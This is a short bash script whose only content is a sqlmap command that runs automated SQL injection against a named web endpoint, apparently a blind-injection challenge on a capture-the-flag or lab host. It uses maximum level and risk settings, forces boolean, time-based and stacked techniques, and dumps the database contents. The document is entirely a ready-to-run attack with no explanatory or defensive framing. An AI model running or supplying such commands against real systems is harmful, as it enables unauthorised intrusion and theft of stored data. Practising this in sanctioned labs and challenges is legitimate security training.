#!/bin/bash

sqlmap -u http://web.camscsc.org/14-blnd/query.php --data='input=*' -p input --random-agent --level=5 --risk=3 --dump --dbms=MySQL --technique=QBT -o --flush-session --threads 1
